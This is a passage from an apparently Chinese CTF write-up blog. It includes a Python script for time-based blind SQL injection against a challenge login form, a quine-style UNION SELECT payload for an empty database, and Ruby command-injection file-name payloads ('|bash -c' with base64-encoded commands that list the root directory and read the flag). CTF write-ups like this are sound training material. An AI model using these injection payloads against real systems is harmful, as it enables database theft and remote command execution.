<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">url=<span class="string">&quot;http://114.115.143.25:32770&quot;</span></span><br><span class="line">s=requests.session()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hex_tran</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">return</span> hex(s).replace(<span class="string">&quot;0x&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tran_str</span>(<span class="params">g</span>):</span></span><br><span class="line">    tran_tmp=<span class="string">&quot;&quot;</span></span><br><span class="line">    g = binascii.unhexlify(g)</span><br><span class="line">    print(g.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    tran_tmp=g</span><br><span class="line">    print(tran_tmp[::<span class="number">-1</span>])</span><br><span class="line">    <span class="keyword">return</span> tran_tmp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sql_injection</span>(<span class="params">payload:str</span>):</span></span><br><span class="line">    wd_tr=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">            <span class="comment">#payload_fina=f&quot;1&#x27;or/**/case/**/(select/**/hex(right((&#123;payload&#125;),&#123;j&#125;))/**/in/**/(&#x27;&#123;hex_tran(i)+wd_tr&#125;&#x27;))/**/when/**/1/**/then/**/benchmark(100000,sha1(sha1(sha1(sha1(sha1(sha1(sha1(&#x27;HWG&#x27;))))))))/**/else/**/1/**/end#&quot;</span></span><br><span class="line">            payload_fina =<span class="string">f&quot;1&#x27;or/**/case/**/(select/**/ascii(mid((<span class="subst">&#123;payload&#125;</span>),<span class="subst">&#123;j&#125;</span>,1)))/**/when/**/(<span class="subst">&#123;i&#125;</span>)/**/then/**/benchmark(1000000,sha1(sha1(sha1(sha1(sha1(sha1(sha1(sha1(sha1(sha1(&#x27;HWG&#x27;)))))))))))/**/else/**/1/**/end#&quot;</span></span><br><span class="line">            data=&#123;</span><br><span class="line">                <span class="string">&quot;username&quot;</span>:<span class="string">&quot;admin&quot;</span>,</span><br><span class="line">                <span class="string">&quot;password&quot;</span>:payload_fina</span><br><span class="line">            &#125;</span><br><span class="line">            print(data)</span><br><span class="line">            times=time.time()</span><br><span class="line">            r=s.post(url,data=data).text</span><br><span class="line">            print(r)</span><br><span class="line">            <span class="keyword">if</span> time.time()-times &gt;= <span class="number">7</span>:</span><br><span class="line">                wd_tr+=chr(i)</span><br><span class="line">                print(wd_tr)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> i==<span class="number">127</span>:</span><br><span class="line">                print(wd_tr)</span><br><span class="line">                exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ ==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    payload=<span class="string">&quot;version()&quot;</span></span><br><span class="line">    <span class="comment">#payload=&quot;database()&quot;</span></span><br><span class="line">    <span class="comment">#payload=&quot;select group_concat(table_name) from information_schema.tables where table_schema in (select database())&quot;.replace(&quot; &quot;,&quot;/**/&quot;)</span></span><br><span class="line">    <span class="comment">#payload=&quot;select group_concat(table_name) from sys.schema_table_statistics&quot;.replace(&quot; &quot;,&quot;/**/&quot;)</span></span><br><span class="line">    <span class="comment">#payload=&quot;select group_concat(a.2) from (select 1,2,3 union select * from `users`)a&quot;.replace(&quot; &quot;,&quot;/**/&quot;)</span></span><br><span class="line">    <span class="comment">#payload=&quot;select group_concat(column_name) from information_schema.columns where table_name in (&#x27;Fl49ish3re&#x27;)&quot;.replace(&quot; &quot;,&quot;/**/&quot;)</span></span><br><span class="line">    <span class="comment">#payload=&quot;select group_concat(f1aG123) from Fl49ish3re&quot;.replace(&quot; &quot;,&quot;/**/&quot;)</span></span><br><span class="line">    sql_injection(payload)</span><br></pre></td></tr></table></figure>

<p>注出来以后，发现数据库是空的，卡了很久，后来才想到，数据库为空，又要让我们输入的内容和输出的内容一致的话，就需要自己构造一下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;&#x2F;**&#x2F;UNION&#x2F;**&#x2F;SELECT&#x2F;**&#x2F;REPLACE(REPLACE(&#39;&quot;&#x2F;**&#x2F;UNION&#x2F;**&#x2F;SELECT&#x2F;**&#x2F;REPLACE(REPLACE(&quot;^&quot;,unhex(hex(34)),unhex(hex(39))),unhex(hex(94)),&quot;^&quot;)#&#39;,unhex(hex(34)),unhex(hex(39))),unhex(hex(94)),&#39;&quot;&#x2F;**&#x2F;UNION&#x2F;**&#x2F;SELECT&#x2F;**&#x2F;REPLACE(REPLACE(&quot;^&quot;,unhex(hex(34)),unhex(hex(39))),unhex(hex(94)),&quot;^&quot;)#&#39;)#</span><br></pre></td></tr></table></figure>

<p>大师傅跟我说，遇到这种题目，其实可以这样尝试一波：<br>在后面注入password like “%” 因为如果数据库有数据，那么任何数据like %都是满足的，如果依然返回false，说明数据库是空的<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210926210628.png" alt="img" style="zoom:67%;"><br>当然首先是你的用户名是正确的</p>
<h2 id="png转换器"><a href="#png转换器" class="headerlink" title="png转换器"></a>png转换器</h2><p>看了一下框架是ruby，这个时候应该用排除法，肯定不是文件上传，因为无法访问到图片，接下就是convert png file的框，这里又有什么情况可能呢？<br>ssti注入，命令执行，似乎也无了，ssti注入没地方回显，所以肯定也不是，这里就学到一个新姿势</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">file&#x3D;|bash -c &quot;$(echo &#39;bHMgLw&#x3D;&#x3D;&#39; | base64 -d)&quot; #.png</span><br><span class="line">cat &#x2F;FLA9_KywXAv78LbopbpBDuWsm</span><br><span class="line">file&#x3D;|bash -c &quot;$(echo &#39;Y2F0IC9GTEE5X0t5d1hBdjc4TGJvcGJwQkR1V3Nt&#39; | base64 -d)&quot; #.png</span><br></pre></td></tr></table></figure>

<p>这个就是ruby命令执行的姿势了，将命令执行的结果以base64的方式存储在png中</p>
</div><hr></div><nav id="pagination"><div class="pagination"><a class="extend prev" rel="prev" href="/page/7/"><i class="fa fa-chevron-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/7/">7</a><span class="page-number current">8</span><a class="page-number" href="/page/9/">9</a><span class="space">&hellip;</span><a class="page-number" href="/page/22/">22</a><a class="extend next" rel="next" href="/page/9/"><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer><div class="layout" id="footer"><div class="copyright">&copy;2013 - 2022 By vague huang</div><div class="framework-info"><span>Driven - </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a target="_blank" rel="noopener" href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_site_uv"><i class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span><span></span></span><span class="footer-separator">|</span><span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_site_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/lib/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.9.0"></script><script src="/js/fancybox.js?version=1.9.0"></script><script src="/js/sidebar.js?version=1.9.0"></script><script src="/js/copy.js?version=1.9.0"></script><script src="/js/fireworks.js?version=1.9.0"></script><script src="/js/transition.js?version=1.9.0"></script><script src="/js/scroll.js?version=1.9.0"></script><script src="/js/head.js?version=1.9.0"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false});</script></body></html>